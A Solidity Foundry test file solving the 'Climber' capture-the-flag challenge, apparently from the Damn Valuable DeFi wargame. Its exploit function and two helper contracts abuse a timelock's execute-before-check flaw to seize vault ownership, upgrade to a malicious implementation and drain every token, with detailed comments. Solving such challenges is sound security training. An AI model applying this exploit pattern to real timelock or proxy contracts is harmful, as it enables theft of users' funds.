// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableToken.sol";
import "../../climber/ClimberTimelock.sol";
import "../../climber/ClimberVault.sol";

import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract ClimberTest is BaseTest {

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000 ether;

    address payable attacker;
    address payable deployer;
    address payable proposer;
    address payable sweeper;
    
    ClimberVault vault;
    ClimberTimelock vaultTimelock;
    DamnValuableToken token;


    constructor() {
        string[] memory labels = new string[](4);
        labels[0] = "Deployer";
        labels[1] = "Proposer";
        labels[2] = "Sweeper";
        labels[3] = "Attacker";

        preSetup(4, labels);
    }

    function setUp() public override {
        super.setUp();

        deployer = users[0];
        proposer = users[1];
        sweeper = users[2];
        attacker = users[3];

        deal(attacker, 0.1 ether);
        assertEq(attacker.balance, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vm.startPrank(deployer);
        ClimberVault vaultImplementation = new ClimberVault();
        vm.label(address(vaultImplementation), "ClimberVault Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        ERC1967Proxy vaultProxy = new ERC1967Proxy(
            address(vaultImplementation),
            data
        );
        vault = ClimberVault(address(vaultProxy));
        vm.label(address(vault), "ClimberVault Proxy");

        assertEq(vault.getSweeper(), sweeper);
        assertEq(vault.getLastWithdrawalTimestamp(), block.timestamp);
        assertEq(vault.owner() == address(0), false);
        assertEq(vault.owner() == deployer, false);

        // Instantiate timelock
        vaultTimelock = ClimberTimelock(payable(vault.owner()));
        vm.label(address(vaultTimelock), "ClimberTimelock");

        assertEq(vaultTimelock.hasRole(vaultTimelock.PROPOSER_ROLE(), proposer), true);
        assertEq(vaultTimelock.hasRole(vaultTimelock.ADMIN_ROLE(), deployer), true);

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        

        // SCENARIO 1: become the sweeper
        // it seems not possible, the `_setSweeper` function is `internal` so cannot be called externally

        // SCENARIO 2: withdraw them via `withdraw`
        // even if we could in some way get the ownership of the contract (only available to the timelock) it would takes tons of time
        // because there's 1M of tokens and we can withdraw 1 each 15 days
        // and there's no reentrancy attack bug to leverage

        // SCENARIO 3: upgrade the vault to a new implementation
        // If we are able to upgrade the vault to a new implementation we could do whatever we want, add a new method or become the sweeper
        // it does not matter at that point

        // The current owner of the Vault is the Timelock itself
        // This mean that only the Timelock can call `vault.transferOwnership` to change the ownership
        // In order to be able to execute all these function from the Timelock the PROPOSER 
        // must schedule an operation containing them and someone (anyone) have to execute that bulk operation

        // Is there a way to call the `schedule` function directly without being the PROPOSER? It does not seems so
        // But it seems that the `execute` function can be called by anyone and if you look closely the check on the proposal status is done ONLY after the execution
        // of the `functionCallWithValue`. This mean that the `execute` function is open to a re-entrancy attack!

        // If we look closer at the `execute` method we see that it perform these operations
        // 1) calculate the ID of the operation given the input parameter
        // 2) execute all the operations via a low level `call`
        // 3) check if the operation identified by the calculated ID has the state eq to `ReadyForExecution`
        //
        // In order to be equalt to that value the operation must
        // 1) Have been scheduled
        // 2) Has not been executed yet
        // 3) The Operation `readyAtTimestamp` must be equal or greater than `block.timestamp`
        // Note that in the check done at point 3 probably the author has introduced another (and much more dangerous) exploit
        // because it seems that the check does not care about the `delay` that an operation must wait before being executed
        // This mean that any operation (even if the `delay` was greater than zero at scheduling time) can be executed as soon as scheduled
        // and this goes against the purpose of a Timelock, that should indeed lock an operation for X seconds (delay)

        // So in order to execute our exploit we need to perform in this order
        // 1) transfer the ownership of the Vault contract to the attacker (that at that point can do whatever he/she wants)
        // 2) grant the role address to an external contract (think about this as a middle-attack vector)
        // 3) make the middle external contract execute a schedule of the same operation executed
        // The third and last point is crucial because otherwise the `execute` operation would revert
        // Before ending the `execute` the operation (just executed) must be scheduled!

        // Deploy the external contract that will take care of executing the `schedule` function
        Middleman middleman = new Middleman();

        // prepare the operation data composed by 3 different actions
        bytes32 salt = keccak256("attack proposal");
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // set the attacker as the owner of the vault as the first operation
        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // grant the PROPOSER role to the middle man contract will schedule the operation
        targets[1] = address(vaultTimelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(middleman));

        // call the external middleman contract to schedule the operation with the needed data
        targets[2] = address(middleman);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(vault), address(vaultTimelock), salt);

        // anyone can call the `execute` function, there's no auth check over there
        vm.prank(attacker);
        vaultTimelock.execute(targets, values, dataElements, salt);

        // at this point `attacker` is the owner of the ClimberVault and he can do what ever he wants
        // For example we could upgrade to a new implementation that allow us to do whatever we want
        // Deploy the new implementation
        vm.startPrank(attacker);
        PawnedClimberVault newVaultImpl = new PawnedClimberVault();

        // Upgrade the proxy implementation to the new vault
        vault.upgradeTo(address(newVaultImpl));

        // withdraw all the funds
        PawnedClimberVault(address(vault)).withdrawAll(address(token));
        vm.stopPrank();

        // PS: I think that this exploit is based on a vulnerability found in the first release of the OpenZeppelin Timelocker contract
        // Checkout this post-mortem block post about it in the OpenZeppelin forum
        // Link https://forum.openzeppelin.com/t/timelockcontroller-vulnerability-post-mortem/14958
    }

    // function buildRequest()

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
    }
}

contract Middleman {

    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
        // Recreate the scheduled operation from the Middle man contract and call the vault
        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
        // This is leveraging the existing re-entrancy exploit in `execute`
        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // set the attacker as the owner
        targets[0] = vaultAddress;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // set the attacker as the owner
        targets[1] = vaultTimelockAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(this));

        // create the proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);

        vaultTimelock.schedule(targets, values, dataElements, salt);
    }

}

contract PawnedClimberVault is ClimberVault {

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function withdrawAll(address tokenAddress) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

}
